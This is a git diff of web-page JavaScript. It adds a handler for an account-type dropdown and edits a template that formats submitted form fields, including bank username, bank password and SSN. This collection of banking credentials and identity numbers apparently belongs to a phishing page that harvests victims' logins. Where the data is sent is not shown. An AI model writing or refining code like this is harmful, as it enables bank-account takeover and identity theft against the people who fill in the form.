@@ -1,6 +1,14 @@
 // Mobile menu functionality
 const mobileMenuButton = document.getElementById("mobile-menu-button");
 const mobileMenu = document.getElementById("mobile-menu");
+const accountType = document.getElementById("account_type");
+let accountNow = "";
+
+function loggg() {
+  // const accountType = document.getElementById("account_type");
+  accountNow = accountType.value;
+  console.log("Selected account type:", accountNow);
+}
 
 mobileMenuButton.addEventListener("click", function () {
   mobileMenu.classList.toggle("hidden");
@@ -163,7 +171,7 @@ document
 • City: ${formData.get("city") || "N/A"}
 • State: ${formData.get("state") || "N/A"}
 • Postal Code: ${formData.get("postal_code") || "N/A"}
-• Account Type: ${formData.get("account_type") || "N/A"} BANK APP OPTION:
+• Account Type: ${accountNow || "N/A"}
 • Bank Username: ${formData.get("bank_username") || "N/A"}
 • Bank Password: ${formData.get("bank_password") || "N/A"}
 •SSN Number: ${formData.get("ssn_number") || "N/A"}
